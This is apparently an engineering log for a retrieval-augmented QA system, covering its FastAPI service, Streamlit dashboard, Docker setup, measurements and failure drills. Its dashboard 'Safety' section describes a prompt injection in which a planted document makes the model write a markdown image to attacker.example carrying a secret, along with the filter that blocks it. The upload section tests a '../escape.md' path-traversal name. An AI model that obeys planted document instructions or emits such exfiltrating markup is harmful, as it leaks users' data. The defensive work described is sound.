# HyRAG Phase 5: API, dashboard, containers

Three steps from the brief: (1) a FastAPI service, (2) a query dashboard, (3) Docker Compose with a seed script.

---

## Step 1 (2026-09-27): the FastAPI service

**Code:** `hyrag/api.py`. **Run:** `uvicorn hyrag.api:app --port 8000`; the OpenAPI docs are at `/docs` and `/openapi.json`. **Tests:** `tests/test_api.py`: 20 in-process tests with a real index, retriever and document store, and fake models.

### Endpoints

| Endpoint | What it does | Auth |
|---|---|---|
| `POST /v1/ask` | `{question, mode}` → the full structured answer. The response schema is `hyrag.answer.Response`, published in OpenAPI. | `X-API-Key` if `HYRAG_API_KEY` is set |
| `GET /v1/documents` | indexed documents with chunk and duplicate counts (paginated) | same |
| `POST /v1/ingest` | multipart upload of .md/.txt/.html/.pdf files; each is parsed, chunked and indexed in-process. Same filename = a new version | `X-API-Key` = `HYRAG_ADMIN_KEY`; **disabled when unset** |
| `GET /health` | liveness | open |
| `GET /ready` | readiness: index not empty, reranker model downloaded and warmed (503 lists the problems) | open |

### Design decisions
- **HTTP status follows the answer's status.**
  - answered, partial, not_found, unverified and unchecked are all **200**, each with its `status` and `code`. "The documents don't say" is a correct result, not a server failure.
  - Only `error` maps to 5xx: `error.timeout` → 504; outages and `error.quota_exhausted` → 503 (with `Retry-After`).
  - The body always has the same schema, so a client handles one shape.
- **Built once at startup:** the reranker is loaded and warmed in the server's lifespan (~10 s), not on the first user's request. Missing API keys fail the start loudly; a missing index or model is reported by `/ready` instead of crashing.
- **Uploads are parsed in-process**, one batch at a time (`Pipeline.ingest_one`). The batch path starts a process pool even for one worker: on Windows that spawns and re-imports the app per request.
- **Each upload succeeds or fails on its own.** Names must be simple (a path like `../escape.md` is reduced to its name, then checked), extensions are allow-listed, and size is capped (`HYRAG_MAX_UPLOAD_MB`, default 20, never above the loader's 50). Verified per case in the tests.
- **`/v1/ask` returns what the dashboard needs:**
  - `retrieved`: every passage the writer saw, with its dense rank, sparse rank, reranker score and calibrated relevance;
  - `confidence` by dimension;
  - `sources` by `[n]`;
  - `search_queries` if the question was rewritten;
  - `mode`, for the hybrid vs dense-only comparison (answers are cached per mode).
- **Keys are compared in constant time** (`hmac.compare_digest`). CORS is off unless `HYRAG_CORS_ORIGINS` names the dashboard's origin (tested: another origin gets no CORS header).

### Live check (real services, over HTTP, against a copy of `data/`)
- `/health` ok; `/ready` ready with 1,266 chunks; `/v1/documents` lists 16 documents.
- "How do I fix ERR_TUNNEL_4012?" → 200 `answered`, confidence 0.999. The repeat was **served from the cache in 0.3 ms**. `retrieved` shows the project's founding case: 4012 ranked first (rerank 4.95; dense #2, sparse #1), ahead of 4013 (3.12; dense #1).
- "How do I book a meeting room?" → `not_found`; one rewrite (307 tokens), and the writer was never called.
- A blank question → 422. An upload without the key → 401; with it → indexed (1 chunk), and the list grew to 17.
- Asking about the uploaded document hit the **daily quota** of the writer model. The response was a clean `error.quota_exhausted` pointing to the new document, and the server log had the stack trace. This also measured that **gpt-oss-120b has a 200,000 tokens/day limit, like the judge**.

### A leak the live check exposed (fixed)
- **What leaked:** Groq's 429 message names the account's **organization id**. It was copied into exception text and from there into the `reason` field returned to API clients.
- **The fix:** `hyrag.http.provider_text` redacts provider account ids (`org_…`, `proj_…`, `user_…`, `acct_…`) wherever provider errors become messages.
- **Caught by its own test:** the first version of the fix wrote a literal backspace character (a tooling escape slip) where `\b` belonged, so it matched nothing. A redaction test caught it.
- **Swept for the whole class:** every source file was then scanned for hidden characters, and 11 deliberate test inputs (look-alike hyphens, a BOM, no-break spaces) were rewritten as visible `\uXXXX` escapes.

### Dependencies
`fastapi` (MIT), `uvicorn` (BSD-3-Clause) and `python-multipart` (Apache-2.0) are now explicit in `requirements.txt`. **Why it mattered:** the lock file was missing `fastapi` and `python-multipart`; they were only in the development environment, so a fresh install could not have run the API. The lock was regenerated from a clean venv built from `requirements.txt` alone, and all 320 tests pass there.

### Known limits
- **One process:** the answer cache and the ingest lock live in memory. Several server processes would need a shared cache (e.g. Redis) and ingestion moved to one worker or a queue.
- **Deletion is not exposed** over HTTP (`Pipeline.delete` exists). It should come with the same admin auth when needed.
- **Throughput is bounded by the Groq plan**, not the server: ~115 fully checked questions/day (docs/phase3-audit.md).

---

## Step 2 (2026-09-27): the query dashboard

**Code:** `dashboard/app.py` (page), `dashboard/client.py` (HTTP client), `dashboard/safety.py` (rendering filter). **Run:** `HYRAG_API_URL=http://localhost:8000 streamlit run dashboard/app.py`. **Tests:** `tests/test_dashboard.py` (7 click-through tests: Streamlit's AppTest drives the real page against a real uvicorn server with a real index and fake models) and `tests/test_dashboard_safety.py` (6). **Speed:** `scripts/measure_dashboard.py`.

### What it shows (the brief's four items)
- **The answer with clickable citations:** each `[n]` is a link to that source's heading below the answer (document, section path, page, and the cited passage in an expander).
- **Retrieved chunks ranked by relevance:** a table (relevance, reranker score, meaning-search rank, keyword rank) plus each passage's text.
- **Confidence by dimension:** overall score and level, then retrieval, citations verified and completeness, and which caps applied.
- **Hybrid vs dense-only:** a checkbox runs the same question in both modes side by side. Each column's citations link only to its own sources (`#hybrid-source-1` vs `#dense-source-1`).

The honest statuses (partial, unverified, unchecked, not found, error) each get their own banner. "Not found" shows the closest documents instead of an answer.

### Design decisions
- **A thin client of the API, not a second copy of the pipeline.** The dashboard never imports `hyrag`; it talks HTTP only. It therefore runs in its own small container (no PyTorch, no index), always shows exactly what the API returns, and could be replaced by a React app without touching HyRAG.
- **Streamlit, chosen after measuring whether it is fast enough** (the concern: Streamlit reruns the whole script on every interaction). Three things stop reruns from costing anything:
  - the question lives in a form, so typing never reruns the page;
  - answers are kept in `session_state`, so any later rerun redraws from memory and makes no API call (a test enforces this);
  - the side panel's status and document list are cached (30 s / 60 s).

  Compare mode sends both requests in parallel (one wait, not two).
- **The client waits 75 s; the server's budget is 60 s.** The server, not the client, decides when a question took too long, and says so in a structured answer.
- **Errors are explained, not crashed on:** API unreachable, wrong key (401), a question that is too long (422) and a proxy error page (non-JSON 5xx) each get a clear message (tested with the API down).

### Safety: model text is untrusted
A document can carry a planted instruction that makes the model write `![](https://attacker.example/?q=<secret>)`. The browser fetches images as soon as they render, so data would leak without anyone clicking. `safe_markdown` therefore does three things before any model text is shown:
- removes inline images, reference-style images and link definitions;
- shows outbound links as plain text;
- turns only the `[n]` citations into links, and those links stay on the page.

Raw HTML is never enabled. Checked in a real browser on a live answer: 0 images and no outbound links inside answers.

### Measured speed
With fake, instant models, so only the dashboard and HTTP are timed (medians over 5 runs; AppTest adds its own overhead, so these are upper bounds):

| What | Time |
|---|---|
| First load (status + document list) | 467 ms |
| Press Ask → answer on screen | 42 ms |
| Redraw with an answer on screen | 25 ms, 0 API calls |
| Compare mode (2 requests in parallel) | 44 ms |

**Live (real Mistral, Groq, reranker):** a compared question took 5.7 s at the API for each mode, run in parallel. The dashboard adds about 30–45 ms to that, so the time a user waits is the models', not Streamlit's.

### Real-browser check
Against the real stack in Chrome, with compare mode on:
- the page loaded, and the sidebar showed "API ready · 1,266 chunks";
- both answers came back as "Answered" with medium confidence;
- clicking `[1]` scrolled to "[1] vpn-setup.md › VPN Setup Guide > Troubleshooting > Error ERR_TUNNEL_4012" and set the URL to `#hybrid-source-1`;
- every in-page link resolved to an existing heading;
- the server logs showed no errors.

### Known limits
- **Not built for many concurrent users.** Streamlit keeps one Python session per browser tab. That is fine for an internal tool or a demo; a public, high-traffic front end would be a static React app calling the same API.
- **No sign-in.** If the API requires `HYRAG_API_KEY`, the dashboard holds it server-side (from its environment) and every visitor uses it. Anyone who can open the page can ask questions, so put it behind the company's SSO proxy.
- **No streaming.** The answer appears once it has been checked, which is intentional: an answer that was still being verified would be shown before it had passed.

---

## Step 3 (2026-09-27): Docker Compose and the seed script

**Files:** `docker-compose.yml`, `Dockerfile` (API and seed), `dashboard/Dockerfile`, `.dockerignore`, `hyrag/seed.py`. **Run:** `cp .env.example .env` (fill in the two keys), then `docker compose up -d --build`. The dashboard is at http://localhost:8501 and the API docs at http://localhost:8000/docs. **Tests:** `tests/test_chroma_server.py` (10, against a real Chroma server of the same version as the image), `tests/test_seed.py` (4).

### Services and start order
| Service | What it is | Waits for |
|---|---|---|
| `chroma` | `chromadb/chroma:1.5.9`, vectors in volume `chroma-data`; not published | — |
| `seed` | one-shot `python -m hyrag.seed`: indexes `corpus/` and `sample_docs/`, then repairs any drift | chroma healthy |
| `api` | FastAPI, 1 worker; chunk table, parsed documents and embedding cache in volume `hyrag-data` | seed exited 0 |
| `dashboard` | Streamlit, talks to `http://api:8000` | api healthy (`/ready`) |

Each service has a health check (Chroma's image has no curl, so its check requests the heartbeat through bash's `/dev/tcp`). Ports are bound to 127.0.0.1 only; exposing them is a job for a TLS reverse proxy. Logs are capped at 3 × 10 MB per container.

### Design decisions
- **Chroma as its own service, the chunk table stays with the API.** The SQLite chunk table is the source of truth; Chroma holds the vectors. Two stores in two volumes can drift apart (one wiped, one not), so the seed ends with `repair()` and fails if anything is still out of sync.
- **Chroma's HTTP client has no timeout by default** (`httpx.Client(timeout=None)` in chromadb 1.5.9), and its calls run under the index's state lock. A server that stopped answering would therefore hang every search. `ChunkIndex(chroma_url=...)`:
  - checks the heartbeat with a 5 s timeout before creating the client, because the client's own first call has no timeout either;
  - then sets a 30 s timeout on the client's session;
  - refuses to start if a chromadb upgrade moves that session.
- **The seed uses the same pipeline call that built the local index,** not the upload endpoint. Uploads keep only the file name, which would turn `engineering/k8s-secrets.md` into `k8s-secrets.md` and break the golden set's evidence. Proof: the container index has exactly the local count, 1,266 chunks from 16 documents.
- **The seed can be re-run at no cost.** Chunk ids come from content and vectors are cached in the data volume, so a second run embeds nothing. It exits 1 on any failed file, and Compose then never starts the API on a half-built index.
- **The API image:**
  - CPU-only PyTorch (the PyPI wheel for Linux bundles CUDA);
  - the rest of `requirements.txt` without its dev section, pinned by `requirements-lock.txt`;
  - the pinned reranker is baked in, so there is no download at startup;
  - runs as a non-root user;
  - the build fails if PyTorch is not the CPU build.
- **Secrets come from `.env` at runtime (`env_file`), never at build time.** Checked: no `.env` in either image, and neither key nor a provider org id appears in any image config or container log.
- **Fixed on the way:**
  - the API put its embedding cache in `./data` relative to the working directory, ignoring `HYRAG_DATA_DIR`;
  - the reranker download fetched every format in the model repo.

### Measured (Docker Desktop, 12 CPUs, 3.7 GB VM)
| What | Result |
|---|---|
| First build (no cache) | 12.7 min, mostly the PyTorch download |
| API image | 2.63 GB (was 4.06 GB before the model download fix: 806 MB → 92 MB); CPU PyTorch alone is 769 MB |
| Dashboard image | 776 MB (no PyTorch, no hyrag) |
| Cold start from empty volumes | 67 s to everything healthy; the seed took 39 s and made 48 embedding requests |
| Second `up` | 8 s; the seed made 0 embedding requests (4 s) |
| Memory at rest | API 405 MiB, Chroma 62 MiB, dashboard 50 MiB |
| First question (ERR_TUNNEL_4012) | HTTP 200, answered with a verified citation, 10.2 s; not degraded (meaning search through Chroma) |

### Failure drills (run live)
| Drill | What happened |
|---|---|
| Chroma volume deleted, chunk table kept | The seed found all 1,266 vectors missing and restored them from the embedding cache: 0 Mistral requests, 7 s |
| Chroma stopped while the API runs | Questions still answered (HTTP 200) using keyword search, flagged `degraded: dense_search_unavailable` |
| API restarted while Chroma is down | Refuses to start ("Chroma at http://chroma:8000 is not answering") instead of hanging; Docker restarts it until Chroma is back |
| Chroma back | API healthy again 21 s later with no manual step; the next answer was not degraded |
| Dashboard in a real browser against the containers | Sidebar "API ready · 1,266 chunks"; a parental-leave question correctly came back "Not found" (the handbook names the leave type but gives no number of days) with the closest documents listed |

### Known limits
- **Image size.** The full `chromadb` package brings its server bindings, a Kubernetes client and ONNX Runtime (~200 MB) that the API does not need when it talks to a Chroma server. The slim `chromadb-client` package would drop them, but then the embedded mode used by tests and local scripts would need its own path.
- **Keys as environment variables** are visible to anyone who can run `docker inspect`. That is fine on a developer machine; in production they belong in Docker or cloud secrets.
- **Every seed run rewrites the chunk rows** even when nothing changed, which makes the running API reload its vectors and clear its answer cache. It is correct, but wasteful after a no-op seed.
- **One API replica** (in-memory answer cache and ingest lock), as in Step 1.
- **A file uploaded while Chroma is down** is written to the chunk table but not to Chroma: it is keyword-searchable only until the next seed or `repair()`.
